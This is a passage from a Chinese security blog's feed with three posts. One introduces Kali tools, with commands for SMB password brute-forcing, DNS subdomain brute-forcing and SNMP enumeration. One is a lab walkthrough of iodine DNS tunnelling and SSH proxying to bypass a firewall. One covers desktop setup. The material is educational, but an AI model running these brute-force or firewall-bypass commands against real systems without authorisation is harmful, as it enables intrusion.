      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o&quot;&gt;&lt;a href=&quot;#emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali使用入坑指南（二）</title>
    <link href="http://TimeS0ng.github.io/2018/03/08/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://TimeS0ng.github.io/2018/03/08/kali使用入坑指南（二）/</id>
    <published>2018-03-08T15:19:13.000Z</published>
    <updated>2018-12-18T15:27:14.483Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"><a href="#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。" class="headerlink" title="&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"></a>&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。</h4><a id="more"></a>
<h2 id="0x01-DNS-爆破工具–fierce"><a href="#0x01-DNS-爆破工具–fierce" class="headerlink" title="0x01. DNS 爆破工具–fierce"></a>0x01. DNS 爆破工具–fierce</h2><blockquote>
<p>fierce 专用于爆破 DNS 域名，就像它的名字一样纯粹，平时msf 用的多了也喜欢用点简单小巧又功能实用的工具。在渗透测试时，偶尔会碰到某些域名的主站被做成了全静态页面，神仙也难渗透。此时从旁站渗透是必然的选择，这时候就需要用到 fierce 爆破二级域名对旁站下黑手了。再给大家推荐一篇<a href="http://cms.pengyueisos.com/wp/2017/12/一次web渗透测试的经历与分析（上）【鹏越·学霸专/" target="_blank" rel="external">渗透旁站的文章</a></p>
<p>爆破二级域名</p>
<p>fierce -dns kali.org -threads 10</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222717_PXjw12_Screenshot.jpeg" alt=""><br><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222753_JKcqYH_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-SMB-爆破工具–acccheck"><a href="#0x02-SMB-爆破工具–acccheck" class="headerlink" title="0x02. SMB 爆破工具–acccheck"></a>0x02. SMB 爆破工具–acccheck</h2><blockquote>
<p>acccheck是用于探测远程目标主机是否开放smb服务,并尝试连接目标默认IPC$、ADMIN$共享,并通过字典文件尝试爆破 smb 服务的账号密码。有些工具比较简单，所以命令我就不一一介绍了，大家直接用 acccheck -h 就能查看具体的参数介绍。</p>
<p>acccheck -t 192.168.122.140 -u times0ng -P /usr/share/wordlists/wfuzz/general/common.txt -v</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225313_sPwpVJ_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225518_JesTGg_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-SNMP-信息枚举工具–-snmp-check"><a href="#0x03-SNMP-信息枚举工具–-snmp-check" class="headerlink" title="0x03. SNMP 信息枚举工具– snmp-check"></a>0x03. SNMP 信息枚举工具– snmp-check</h2><blockquote>
<p>简单网络管理协议（SNMP）是TCP／IP协议簇的一个应用层协议，工作在UDP 161端口，用于监控目标设备的操作系统、硬件设备、服务应用、软硬件配置、网络协议状态、设备性能及资源利用率、设备报错事件信息、应用程序状态等软硬件信息。对于渗透测试者来说简直就是信息宝藏，一旦这个服务协议被利用，那么目标的大部分配置信息都会暴露无遗，对于企业来说这是致命的，而想要利用这个协议的弱点只需要服务器管理员缺乏安全意识做一些默认配置即可。</p>
<p>这个工具并不支持对 public 的爆破，但如果使用 hydra 爆破public 之后再使用snmp-check 获取 SNMP 协议提供的海量信息的话简直是 perfect</p>
<p>snmp-check 192.168.1.109 -c public -v 2c</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/911ea4f2fd7ee502e967a3c99fb7163b/xmlnote/1B20B5FDF95B4D3E8A2AA48AB71D9D46/3879" alt="image"></p>
<h2 id="0x04-路由策略探测工具–Firewalk"><a href="#0x04-路由策略探测工具–Firewalk" class="headerlink" title="0x04. 路由策略探测工具–Firewalk"></a>0x04. 路由策略探测工具–Firewalk</h2><blockquote>
<p>Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。如果想了解 firewalk 的原理请 <a href="https://times0ng.github.io/2018/03/10/Firewalk-原理/">点击这里</a></p>
<p>首先apt-get 安装firewalk，然后启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</p>
<p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-图形化sql自动注入工具—-jSQL"><a href="#0x05-图形化sql自动注入工具—-jSQL" class="headerlink" title="0x05. 图形化sql自动注入工具—-jSQL"></a>0x05. 图形化sql自动注入工具—-jSQL</h2><blockquote>
<p>jSQL injection是一款基于JAVA开发的图形化 SQL 自动注入工具，包含数据库查询、后台爆破、文件读取、命令行、文件上传、目录爆破、编码转换等众多功能，既支持GET 型SQL 注入，也同时支持POST 型注入，还能定制header 头，是一款不可多得的好工具，很像kali 版御剑</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328215004_6eQEsq_Screenshot.jpeg" alt=""></p>
<h2 id="0x06-WEB-漏洞扫描工具—-OWASP-ZAP"><a href="#0x06-WEB-漏洞扫描工具—-OWASP-ZAP" class="headerlink" title="0x06. WEB 漏洞扫描工具—-OWASP-ZAP"></a>0x06. WEB 漏洞扫描工具—-OWASP-ZAP</h2><blockquote>
<p>最近自己利用 OWASP-ZAP 简单录制了一套web 渗透教程发到b 站了，大家有兴趣可以<a href="https://www.bilibili.com/video/av20890776/" target="_blank" rel="external">点这里</a>，基本用法我都提到过了，还简单讲了一些渗透环境的搭建和利用。</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328220834_N7Y5J3_Screenshot.jpeg" alt=""></p>
<h2 id="0x07-“kali-下的菜刀”—-Altman"><a href="#0x07-“kali-下的菜刀”—-Altman" class="headerlink" title="0x07. “kali 下的菜刀”—-Altman"></a>0x07. “kali 下的菜刀”—-Altman</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&quot;&gt;&lt;a href=&quot;#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>利用iodine绕过防火墙</title>
    <link href="http://TimeS0ng.github.io/2018/03/01/%E5%88%A9%E7%94%A8iodine%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    <id>http://TimeS0ng.github.io/2018/03/01/利用iodine绕过防火墙/</id>
    <published>2018-03-01T14:18:39.000Z</published>
    <updated>2018-03-01T14:23:18.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-iodine简介"><a href="#0x00-iodine简介" class="headerlink" title="0x00. iodine简介"></a>0x00. iodine简介</h2><h4 id="emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！"><a href="#emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！" class="headerlink" title="&emsp;&emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！"></a>&emsp;&emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！</h4><a id="more"></a>
<h2 id="0x01-环境配置"><a href="#0x01-环境配置" class="headerlink" title="0x01. 环境配置"></a>0x01. 环境配置</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-ubuntu-emsp-IP-1-1-1-10"><a href="#emsp-emsp-ubuntu-emsp-IP-1-1-1-10" class="headerlink" title="&emsp;&emsp;ubuntu&emsp;IP=1.1.1.10"></a>&emsp;&emsp;ubuntu&emsp;IP=1.1.1.10</h4><h4 id="emsp-emsp-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-109"><a href="#emsp-emsp-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-109" class="headerlink" title="&emsp;&emsp;monowall&emsp;LAN IP=1.1.1.1&emsp;WAN IP=192.168.1.109"></a>&emsp;&emsp;monowall&emsp;LAN IP=1.1.1.1&emsp;WAN IP=192.168.1.109</h4><h4 id="emsp-emsp-w2k3-emsp-IP-192-168-1-108"><a href="#emsp-emsp-w2k3-emsp-IP-192-168-1-108" class="headerlink" title="&emsp;&emsp;w2k3&emsp;IP=192.168.1.108"></a>&emsp;&emsp;w2k3&emsp;IP=192.168.1.108</h4><h4 id="emsp-emsp-kali-linux-emsp-IP-192-168-1-107"><a href="#emsp-emsp-kali-linux-emsp-IP-192-168-1-107" class="headerlink" title="&emsp;&emsp;kali linux&emsp;IP=192.168.1.107"></a>&emsp;&emsp;kali linux&emsp;IP=192.168.1.107</h4><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><blockquote>
<p>[*] 接下来我将按照下图配置实验环境，通过iodine绕过防火墙限制.</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301210737_kS5adL_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>首先配置firewall，限制ubuntu的上网能力，让它只能通过 UDP 53端口访问DNS 服务器w2k3</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301211815_oLwE6D_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>修改 ubuntu 的/etc/resolv.conf 文件，指定自己的 DNS 解析服务器为w2k3（192.168.1.108）</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301212345_NrgJ35_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>配置 DNS 服务器w2k3，并委派二级域名给 kali 主机</li>
</ol>
<p>[*] _1. 设置静态IP</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301213258_iefU0H_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _2. 创建主域 times0ng.org</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301213519_oaBMz2_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _3. 添加 kali 的主机记录</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301213738_mUUxyM_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _4. 配置转发器，这样让w2k3可以解析公网域名</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301214158_olvW8g_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _5. 委派二级域名</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301214431_F4tb8U_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>[*] _6. 查看ubuntu上的域名解析记录，可以看到 ubuntu 已经能正确解析我们的 w2k3 和 kali 了</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301214910_bBF3h9_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>启动 kali 服务器端 iodined 和 ubuntu 的客户端 iodine</li>
</ol>
<p>iodined -f -c 2.2.2.2 www.times0ng.org</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301215803_FRK2Ke_Screenshot.jpeg" alt=""></p>
<blockquote>
<p>iodine -f www.times0ng.org</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301215953_KMndUT_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>ubuntu 已经通过UDP 53 端口成功和 kali 建立隧道，可以利用之前设置的IP 2.2.2.2 进行网络通信了</li>
</ol>
<p>ssh -X root@2.2.2.2</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301220633_FX4p67_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>因为ubuntu 本身被防火墙限制不能上网，但我们可以将流量通过kali转发出去进行上网通信</li>
</ol>
<p>ssh -CNfg -D 8080 root@2.2.2.2</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301220853_0ex9Bc_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180301220923_sIRb8G_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02. 结语"></a>0x02. 结语</h2><h4 id="emsp-emsp-真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。"><a href="#emsp-emsp-真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。" class="headerlink" title="&emsp;&emsp;真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。"></a>&emsp;&emsp;真实环境中的操作更简单，不过笔者买不起域名和VPS，自己没亲自尝试过！以后就可以利用这个方法绕过各种防火墙限制啦，哇咔咔咔咔咔。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-iodine简介&quot;&gt;&lt;a href=&quot;#0x00-iodine简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. iodine简介&quot;&gt;&lt;/a&gt;0x00. iodine简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&quot;&gt;&lt;a href=&quot;#emsp-emsp-当渗透内网时发现目标主机只开有-DNS-必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP-53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;当渗透内网时发现目标主机只开有 DNS 必要的端口时会不会很懵逼，此时连ssh都用不了，更别说后续留后门、抓密码咯。不过iodine完美的解决了这种问题，它仅仅通过UDP 53端口就能与目标建立一条点到点的流量隧道，并模拟出一块物理网卡让自己和目标可以基于该网卡提供的IP进行网络通信，简直是居家必备、出门在外之必备神器！下面的配置是自己学习iodine的学习笔记，配置细节不会具体说明！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali使用入坑指南(一)</title>
    <link href="http://TimeS0ng.github.io/2018/03/01/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://TimeS0ng.github.io/2018/03/01/kali使用入坑指南（一）/</id>
    <published>2018-03-01T12:25:58.000Z</published>
    <updated>2018-12-18T15:30:06.977Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"><a href="#emsp-emsp-用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！" class="headerlink" title="&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"></a>&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！</h4><a id="more"></a>
<h2 id="0x01-kali安装中文输入法"><a href="#0x01-kali安装中文输入法" class="headerlink" title="0x01. kali安装中文输入法"></a>0x01. kali安装中文输入法</h2><blockquote>
<ol>
<li>下载ibus</li>
</ol>
<p>apt-get install ibus ibus-pinyin</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301093227_Bi7qWn_Screenshot.jpeg)</p>
<blockquote>
<ol>
<li>设置language，之后重启系统就能使用中文，不必太麻烦</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301093613_rmRK04_Screenshot.jpeg)</p>
<h2 id="0x02-kali中安装截图软件-shutter"><a href="#0x02-kali中安装截图软件-shutter" class="headerlink" title="0x02. kali中安装截图软件 shutter"></a>0x02. kali中安装截图软件 shutter</h2><blockquote>
<p>apt-get install shutter</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301201713_O1AXhi_Screenshot.jpeg)</p>
<blockquote>
<p>下面就是我用shutter截的桌面图片</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301201931_pWfnu9_Screenshot.jpeg)</p>
<h2 id="0x03-kali-安装硬件检测软件-hardinfo"><a href="#0x03-kali-安装硬件检测软件-hardinfo" class="headerlink" title="0x03. kali 安装硬件检测软件 hardinfo"></a>0x03. kali 安装硬件检测软件 hardinfo</h2><blockquote>
<p>apt-get install hardinfo</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303170704_ALlIlf_Screenshot.jpeg)</p>
<blockquote>
<p>hardinfo可以让我们轻松的查看系统硬件配置，其功能有点像鲁大师，不过我却没用过鲁大师哈哈哈哈！</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303170842_Vw0EnH_Screenshot.jpeg)</p>
<h2 id="0x04-kali-录屏软件-EasyScreenCast"><a href="#0x04-kali-录屏软件-EasyScreenCast" class="headerlink" title="0x04. kali 录屏软件 EasyScreenCast"></a>0x04. kali 录屏软件 EasyScreenCast</h2><blockquote>
<p>今天笔者也利用kali中自带的录屏软件 EasyScreenCast 录了一个Wi-Fi破解的视频放到B站，如果感兴趣可以<a href="https://www.bilibili.com/video/av20318401/" target="_blank" rel="external">戳这里</a>。EasyScreenCast 使用简单方便，根据自己需要稍稍修改一下参数就能录制满足自己简单要求的视频。</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303171817_6QKqw8_Screenshot.jpeg)</p>
<h2 id="0x05-kali-音乐播放器-VLC"><a href="#0x05-kali-音乐播放器-VLC" class="headerlink" title="0x05. kali 音乐播放器 VLC"></a>0x05. kali 音乐播放器 VLC</h2><blockquote>
<p>虽然 VLC 没有像 Mac 版QQ 音乐那么唯美的优化，但我们也不能对开源如此苛刻，毕竟它从没令我失望过！</p>
<p>apt-get install vlc</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303191548_k9LYCB_Screenshot.jpeg)</p>
<blockquote>
<p>安装完成之后，因为它默认不能以root账号启动，所以我们需要修改 /usr/bin/vlc 文件，将原来的geteuid 修改为现在的 getppid</p>
<p>hexedit /usr/bin/vlc</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303191650_jLTfN6_Screenshot.jpeg)</p>
<blockquote>
